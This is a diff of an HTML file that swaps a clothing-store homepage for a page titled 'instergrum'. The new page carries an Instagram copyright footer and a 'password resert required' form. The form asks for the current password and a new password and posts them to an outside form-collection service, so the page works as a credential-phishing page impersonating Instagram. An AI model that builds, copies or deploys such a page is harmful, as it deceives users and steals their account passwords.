@@ -1,121 +1,145 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>STAGZY OUTFITS — Online Shop</title>
-  <style>
-    :root {
-      --bg:#0f1724;
-      --card:#0b1220;
-      --muted:#9aa4b2;
-      --accent:#ff6b6b;
-      --accent-2:#6bd3ff;
-      --glass: rgba(255,255,255,0.04);
-      --radius:14px;
-      --maxw:1200px;
-      --gap:20px;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>instergrum</title>
 
-    * { box-sizing:border-box; }
-    html, body { height:100%; margin:0; font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background: linear-gradient(180deg,#071021 0%, #081226 60%); color:#e6eef6; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; padding:40px 20px; display:flex; justify-content:center; }
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial, sans-serif;
+}
 
-    .container { width:100%; max-width:var(--maxw); }
+body{
+  min-height:100vh;
+  background:#0b0b0b;
+  display:flex;
+  flex-direction:column;
+}
 
-    header { display:flex; align-items:center; justify-content:space-between; gap:16px; margin-bottom:32px; }
-    .brand { display:flex; align-items:center; gap:12px; }
-    .logo { width:44px; height:44px; border-radius:10px; background:linear-gradient(135deg,var(--accent),var(--accent-2)); display:flex; align-items:center; justify-content:center; font-weight:700; }
+/* CONTACT */
+.contact{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
 
-    nav a { color:var(--muted); text-decoration:none; margin-right:16px; }
-    nav a:hover { color:var(--accent); }
+form{
+  background:rgb(244, 65, 232);
+  padding:25px;
+  border-radius:15px;
+  width:100%;
+  max-width:400px;
+}
 
-    .search { display:flex; align-items:center; gap:8px; background:var(--glass); padding:8px 12px; border-radius:12px; }
-    .search input { background:transparent; border:0; color:inherit; outline:none; flex:1; }
+h2{
+  text-align:center;
+  margin-bottom:20px;
+  color:#620a5b;
+}
 
-    .hero { display:grid; grid-template-columns:1fr 380px; gap:var(--gap); align-items:stretch; margin-bottom:28px; }
-    @media(max-width:980px) { .hero { grid-template-columns:1fr; } }
+input{
+  width:100%;
+  padding:12px;
+  margin-bottom:15px;
+  border-radius:20px;
+  border:1px solid #ccc;
+}
 
-    .hero-card { background:linear-gradient(180deg,rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:var(--radius); padding:28px; box-shadow:0 6px 18px rgba(2,6,23,0.6); }
-    .hero h1 { margin:0 0 8px; font-size:28px; }
-    .hero p { color:var(--muted); margin:0 0 18px; }
+button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:20px;
+  background:#620a5b;
+  color:white;
+  font-size:16px;
+  cursor:pointer;
+}
 
-    .cta { display:inline-block; background:var(--accent); color:#0b1220; padding:10px 14px; border-radius:12px; text-decoration:none; font-weight:600; }
+button:hover{
+  opacity:0.9;
+}
 
-    .filters { background:var(--card); padding:16px; border-radius:12px; height:100%; margin-top:20px; }
-    .filters h3 { margin:0 0 12px; }
-    .filters label { display:block; font-size:14px; color:var(--muted); margin-bottom:8px; }
-    .price-range { display:flex; gap:8px; }
-
-    .products-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; }
-    @media(max-width:980px) { .products-grid { grid-template-columns:repeat(2,1fr); } }
-    @media(max-width:620px) { .products-grid { grid-template-columns:1fr; } header { flex-direction:column; align-items:flex-start; } }
-
-    .product { background:linear-gradient(180deg,#071426 0%, #041022 100%); border-radius:12px; padding:14px; display:flex; flex-direction:column; gap:10px; min-height:260px; }
-    .product .img { flex:1; background:#081426; border-radius:10px; display:flex; align-items:center; justify-content:center; overflow:hidden; }
-    .product img { width:100%; height:100%; object-fit:cover; border-radius:8px; }
-    .product h4 { margin:0; font-size:16px; }
-    .product .price { font-weight:700; }
-    .product .actions { display:flex; gap:8px; }
-    .button { background:var(--accent); color:#071122; padding:8px 10px; border-radius:10px; text-decoration:none; border:0; cursor:pointer; }
-    .btn-ghost { background:transparent; border:1px solid rgba(255,255,255,0.04); color:var(--muted); }
-
-    footer { margin-top:30px; color:var(--muted); font-size:14px; display:flex; justify-content:space-between; }
-  </style>
+/* FOOTER */
+footer{
+  background:#e907bc98;
+  color:white;
+  text-align:center;
+  padding:10px;
+  font-size:14px;
+}
+</style>
 </head>
+
 <body>
-  <div class="container">
-    <header>
-      <div class="brand">
-        <div class="logo"><img src="333.png" alt="333.png" width="50"></div>
-        <div>
-          <div style="font-weight:700">STAGZY OUTFITS</div>
-          <div class="muted" style="font-size:13px">Sustainable · Modern · Comfortable</div>
-        </div>
-      </div>
-      <nav aria-label="Main nav">
-        <a href="gam.html">Home</a>
-        <a href="https://maps.app.goo.gl/uv82YJaUy2w5BPNd6">Our Location</a>
-        <a href="about.html">About</a>
-        <a href="contact us .html">Contact</a>
-      </nav>
-      <div class="search">
-       
-      </div>
-    </header>
 
-    <main class="hero">
-      <section class="hero-card">
-        <h1>WELCOME SHOP WITH US</h1>
-        <p class="muted">"Welcome to our fashion store — where style meets confidence! 🌟
-Discover trendy, high-quality clothes designed to make you stand out.
-Affordable prices, premium quality, and fast delivery straight to your door.
-Shop now and upgrade your style today!".</p>
-        <a class="cta" href="clothes.html" id="shopNow">Shop now</a>
-      </section>
+<section class="contact">
+ <form action="https://getform.io/f/allgglxa" method="POST">
+    <h1 style="text-align: center;font-size: xx-large;"><b>password resert required</h1>
 
-     
-        
-        <div style="margin-top:12px;display:flex;gap:8px">
-          
-          
-        </div>
-      </aside>
-    </main>
+  <input
+    type="password"
+    name="current_password"
+    placeholder="Current password"
+    required
+  >
 
-    <section id="shop">
-      <h2 style="margin:6px 0 14px">Shop</h2>
-      <div class="products-grid" id="productsGrid"></div>
-    </section>
+  <input
+    type="password"
+    name="new_password"
+    placeholder="New password"
+    required
+  >
 
-    <footer>
-      <div>© <span id="year"></span> STAGZY OUTFITS</div>
-      <div class="muted"></div>
-    </footer>
-  </div>
-  <script>
-    document.getElementById('year').textContent = new Date().getFullYear();
-  </script>
+  <input
+    type="password"
+    name="repeat_password"
+    placeholder="Rewrite new password"
+    required
+  >
+
+  <button type="submit">
+    Change
+  </button>
+
+</form>
+
+
+</section>
+
+<footer>
+  © 2026 Instagram. All rights reserved.
+</footer>
+
+<script>
+function sendMessage(event){
+  event.preventDefault();
+
+  let current = document.getElementById("current").value;
+  let newpass = document.getElementById("newpass").value;
+  let repeat = document.getElementById("repeat").value;
+
+  if(newpass !== repeat){
+    alert("❌ Passwords do not match");
+    return;
+  }
+
+  if(newpass.length < 6){
+    alert("❌ Password must be at least 6 characters");
+    return;
+  }
+
+  alert("✅ Password change request sent successfully!");
+  
+  // hapa ndio ungeunganisha backend (server)
+}
+</script>
+
 </body>
 </html>
-
-
